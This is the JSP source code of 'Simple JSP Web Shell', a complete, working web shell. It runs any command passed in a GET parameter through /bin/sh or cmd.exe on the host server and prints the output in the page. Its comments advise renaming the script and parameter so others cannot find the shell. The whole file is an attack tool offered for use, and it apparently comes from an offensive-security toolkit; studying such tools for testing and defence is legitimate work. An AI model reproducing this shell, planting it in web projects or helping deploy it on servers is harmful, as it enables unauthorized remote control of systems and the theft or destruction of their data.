<%@page import="java.util.Arrays"%>
<%@page import="java.io.IOException"%>
<%@page import="java.nio.charset.StandardCharsets"%>
<%@page import="java.io.InputStream"%>

<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v3.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>
<%-- Works on Linux OS, macOS, and Windows OS. --%>

<%-- modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell --%>
<%-- you must URL encode your commands --%>

<%
    // your parameter/key here
    String parameter = "command";
    String output = "";
    if (request.getMethod() == "GET" && request.getParameter(parameter) != null && request.getParameter(parameter).trim().length() > 0) {
        String os    = System.getProperty("os.name").toUpperCase();
        String shell = null;
        if (os.contains("LINUX") || os.contains("MAC")) {
            shell  = "/bin/sh -c";
        } else if (os.contains("WIN")) {
            shell  = "cmd.exe /c";
        } else {
            output = "SYS_ERROR: Underlying operating system is not supported\n";
        }
        if (shell != null) {
            Process     process = null;
            InputStream stdout  = null;
            byte[]      buffer  = null;

            try {
                process = Runtime.getRuntime().exec(String.format("%s \"(%s) 2>&1\"", shell, request.getParameter(parameter).trim()));
                stdout  = process.getInputStream();
                buffer  = new byte[1024];

                int bytes = 0;
                do {
                    bytes = stdout.read(buffer, 0, buffer.length);
                    if (bytes > 0) {
                        output += new String(buffer, 0, bytes, StandardCharsets.UTF_8);
                    }
                } while (bytes > 0);
                output = output.replace("<", "&lt;");
                output = output.replace(">", "&gt;");
            } catch (IOException ex) {
                output = String.format("ERROR: %s\n", ex);
            } finally {
                if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} stdout = null; }
                if (process != null) { process.destroy(); process = null; }
                if (buffer  != null) { Arrays.fill(buffer, (byte)0); buffer = null; }
            }
        }
        // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
        // out.print("<pre>" + output + "</pre>"); output = null; System.gc();
    }
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Simple JSP Web Shell</title>
        <meta name="author" content="Ivan Šincek">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <pre><% out.print(output); output = null; System.gc(); %></pre>
    </body>
</html>
